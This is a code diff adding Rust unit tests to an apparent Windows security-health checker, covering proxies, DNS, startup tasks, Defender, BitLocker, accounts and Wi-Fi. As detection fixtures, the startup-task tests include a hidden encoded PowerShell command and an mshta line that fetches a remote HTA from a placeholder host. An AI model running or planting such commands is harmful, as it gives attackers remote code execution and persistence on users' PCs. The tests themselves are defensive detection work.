@@ -604,6 +604,151 @@ mod tests {
     }
 
     #[test]
+    fn browser_settings_forced_by_a_policy() {
+        let mut s = base();
+        s.security["browserPolicies"] = json!([{"Browser": "Chrome", "Setting": "ExtensionInstallForcelist", "Value": "abcdef;https://x.example/update"}]);
+        let x = evaluate(&s).into_iter().find(|x| x.id == "browser-policies").expect("forced extension");
+        assert_eq!((x.level, x.confidence), (Level::WorthDoing, Confidence::BestGuess));
+        s.system["device"]["Joined"] = json!(true);
+        assert_eq!(level_of(&evaluate(&s), "browser-policies"), None, "work PCs are managed by their IT");
+    }
+
+    #[test]
+    fn proxies_and_dns_servers_nobody_chose() {
+        let net = |n: serde_json::Value| {
+            let mut s = base();
+            s.network = n;
+            let f = evaluate(&s);
+            (level_of(&f, "proxy"), level_of(&f, "dns-changed"))
+        };
+        assert_eq!(net(json!({"proxy": {"Enabled": true, "Server": "45.1.2.3:8080"}})), (Some(Level::WorthDoing), None));
+        assert_eq!(net(json!({"proxy": {"Enabled": true, "Server": "127.0.0.1:8888"}})), (Some(Level::NiceToHave), None), "a local tool");
+        assert_eq!(net(json!({"proxy": {"Enabled": false, "Server": "45.1.2.3:8080"}})), (None, None), "saved but off");
+        assert_eq!(net(json!({"proxy": {"Pac": "http://cfg.example/proxy.pac"}})), (Some(Level::WorthDoing), None));
+        assert_eq!(net(json!({"proxy": {"WinHttp": "45.1.2.3:3128"}})), (Some(Level::WorthDoing), None));
+        assert_eq!(net(json!({"staticDns": ["185.10.10.10"]})), (None, Some(Level::WorthDoing)));
+        assert_eq!(net(json!({"staticDns": ["1.1.1.1", "192.168.1.1", "127.0.2.2", "100.100.100.100"]})), (None, None));
+    }
+
+    #[test]
+    fn switched_off_windows_services() {
+        let mut s = base();
+        s.security["disabledServices"] = json!(["wuauserv"]);
+        assert_eq!(level_of(&evaluate(&s), "services-off"), Some(Level::WorthDoing));
+        s.security["disabledServices"] = json!(["WinDefend"]);
+        s.security["otherAntivirus"] = json!(["Norton 360"]);
+        assert_eq!(level_of(&evaluate(&s), "services-off"), None, "another antivirus has taken over");
+    }
+
+    #[test]
+    fn programs_starting_from_throwaway_folders() {
+        let start = |startup: serde_json::Value, tasks: serde_json::Value| {
+            let mut s = base();
+            s.software = json!({ "startup": startup, "tasks": tasks });
+            level_of(&evaluate(&s), "startup-odd")
+        };
+        let temp = json!([{"Name": "upd", "Command": "C:\\Users\\a\\AppData\\Local\\Temp\\upd.exe", "Enabled": true}]);
+        assert_eq!(start(temp, json!([])), Some(Level::WorthDoing));
+        let discord =
+            json!([{"Name": "Discord", "Command": "\"C:\\Users\\a\\AppData\\Local\\Discord\\Update.exe\" --processStart Discord.exe", "Enabled": true}]);
+        assert_eq!(start(discord, json!([])), None, "apps live in AppData");
+        let off = json!([{"Name": "upd", "Command": "C:\\Users\\Public\\upd.exe", "Enabled": false}]);
+        assert_eq!(start(off, json!([])), None, "already switched off");
+        assert_eq!(start(json!([]), json!([{"Name": "t", "Action": "powershell.exe -w hidden -enc SQBFAFgA"}])), Some(Level::WorthDoing));
+        assert_eq!(start(json!([]), json!([{"Name": "t", "Action": "pwsh -NoProfile -EncodedC SQBFAFgA"}])), Some(Level::WorthDoing), "a short form");
+        assert_eq!(
+            start(json!([]), json!([{"Name": "backup", "Action": r"powershell.exe -ExecutionPolicy Bypass -File C:\Program Files\Tool\run.ps1"}])),
+            None,
+            "-ex is not -enc"
+        );
+        assert_eq!(start(json!([{"Name": "x", "Command": r"%TEMP%\upd.exe", "Enabled": true}]), json!([])), Some(Level::WorthDoing));
+        assert_eq!(start(json!([]), json!([{"Name": "t", "Action": "mshta.exe https://x.example/a.hta"}])), Some(Level::WorthDoing));
+    }
+
+    #[test]
+    fn windows_security_cloud_checks_and_scans() {
+        let av = |cloud: i64, samples: i64, quick: Option<String>, full: Option<String>| {
+            let mut s = base();
+            s.security["defender"]["CloudProtection"] = json!(cloud);
+            s.security["defender"]["SampleSubmission"] = json!(samples);
+            s.security["defender"]["LastQuickScan"] = json!(quick);
+            s.security["defender"]["LastFullScan"] = json!(full);
+            let f = evaluate(&s);
+            (level_of(&f, "av-cloud-off"), level_of(&f, "av-samples-off"), level_of(&f, "av-scan-old"))
+        };
+        assert_eq!(av(2, 1, Some(ago(1)), None), (None, None, None));
+        assert_eq!(av(0, 1, Some(ago(1)), None), (Some(Level::WorthDoing), None, None));
+        assert_eq!(av(2, 2, Some(ago(1)), None), (None, Some(Level::WorthDoing), None), "Windows Security warns about it");
+        assert_eq!(av(2, 1, Some(ago(40)), Some(ago(60))), (None, None, Some(Level::NiceToHave)));
+        assert_eq!(av(2, 1, None, None), (None, None, None), "no data, no guess");
+        let mut s = base();
+        s.security["defender"]["CloudProtection"] = json!(0);
+        s.security["otherAntivirus"] = json!(["Norton 360"]);
+        assert_eq!(level_of(&evaluate(&s), "av-cloud-off"), None);
+    }
+
+    #[test]
+    fn paused_drive_encryption_is_not_missing_encryption() {
+        let enc = |bitlocker: &str, pending: bool| {
+            let mut s = base();
+            s.system["device"]["HasBattery"] = json!(true);
+            s.system["os"]["PendingReboot"] = json!(pending);
+            s.storage = json!({"volumes": [{"Letter": "C:", "SizeGB": 476, "FreeGB": 200, "BitLocker": bitlocker}]});
+            let f = evaluate(&s);
+            (level_of(&f, "bitlocker-suspended"), level_of(&f, "encryption-off"))
+        };
+        assert_eq!(enc("Off / FullyEncrypted", false), (Some(Level::WorthDoing), None));
+        assert_eq!(enc("Off / FullyEncrypted", true), (None, None), "Windows pauses it around updates");
+        assert_eq!(enc("Off / FullyDecrypted", false), (None, Some(Level::WorthDoing)));
+        assert_eq!(enc("On / FullyEncrypted", false), (None, None));
+    }
+
+    #[test]
+    fn driver_blocklist_and_antivirus_overlap() {
+        let mut s = base();
+        win11(&mut s);
+        s.system["os"]["DriverBlocklist"] = json!(0);
+        assert_eq!(level_of(&evaluate(&s), "driver-blocklist-off"), Some(Level::WorthDoing));
+        s.system["os"]["MemoryIntegrity"] = json!("On");
+        assert_eq!(level_of(&evaluate(&s), "driver-blocklist-off"), Some(Level::NiceToHave), "memory integrity enforces it anyway");
+        s.system["os"]["DriverBlocklist"] = json!(null);
+        assert_eq!(level_of(&evaluate(&s), "driver-blocklist-off"), None, "on by default");
+        let mut s = base();
+        s.security["antivirus"] = json!([{"Name": "Norton 360", "On": true}, {"Name": "McAfee", "On": true}, {"Name": "Windows Defender", "On": false}]);
+        assert_eq!(level_of(&evaluate(&s), "two-av"), Some(Level::WorthDoing));
+        s.security["antivirus"] = json!([{"Name": "Norton 360", "On": true}, {"Name": "McAfee", "On": false}]);
+        assert_eq!(level_of(&evaluate(&s), "two-av"), None);
+    }
+
+    #[test]
+    fn guest_and_built_in_administrator_accounts() {
+        let acc = |name: &str, rid: i64, daily: &str| {
+            let mut s = base();
+            s.security["accounts"] = json!([{"Name": name, "Rid": rid, "Enabled": true, "PasswordRequired": true}]);
+            s.security["dailyAccount"] = json!({"Name": daily, "Admin": true, "OtherAdmins": []});
+            let f = evaluate(&s);
+            (level_of(&f, "guest-on"), level_of(&f, "builtin-admin-on"))
+        };
+        assert_eq!(acc("Guest", 501, "PC\\sam"), (Some(Level::WorthDoing), None));
+        assert_eq!(acc("Administrator", 500, "PC\\sam"), (None, Some(Level::WorthDoing)));
+        assert_eq!(acc("Administrator", 500, "PC\\Administrator"), (None, None), "it's the account in use");
+    }
+
+    #[test]
+    fn weak_wifi_security() {
+        let wifi = |w: serde_json::Value| {
+            let mut s = base();
+            s.network = json!({ "wifi": w });
+            level_of(&evaluate(&s), "wifi-weak")
+        };
+        assert_eq!(wifi(json!({"SSID": "Cafe", "Auth": "Open"})), Some(Level::WorthDoing));
+        assert_eq!(wifi(json!({"SSID": "Home", "Auth": "WEP"})), Some(Level::WorthDoing));
+        assert_eq!(wifi(json!({"SSID": "Home", "Auth": "WPA2-Personal", "Cipher": "TKIP"})), Some(Level::WorthDoing));
+        assert_eq!(wifi(json!({"SSID": "Home", "Auth": "WPA2-Personal", "Cipher": "CCMP"})), None);
+        assert_eq!(wifi(json!({"Adapter": "Intel Wi-Fi 6"})), None, "not connected");
+    }
+
+    #[test]
     fn slow_cable_links_and_trim() {
         let link = |speed: &str, media: &str| {
             let mut s = base();
